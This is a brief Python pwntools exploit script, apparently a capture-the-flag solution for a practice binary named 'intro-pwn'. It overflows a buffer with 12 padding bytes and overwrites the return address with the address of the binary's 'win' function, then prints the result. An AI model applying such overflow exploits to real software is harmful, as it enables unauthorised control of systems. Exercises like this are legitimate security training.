from pwn import *
pr =  process('./intro-pwn')
elf = context.binary = ELF('./intro-pwn', checksec=False)


padding = 12
win_addr = p64(elf.symbols['win']) 

payload = b'A' * padding + win_addr


pr.sendline(payload)

out = pr.recvall()
print(out.decode(errors="ignore"))
# 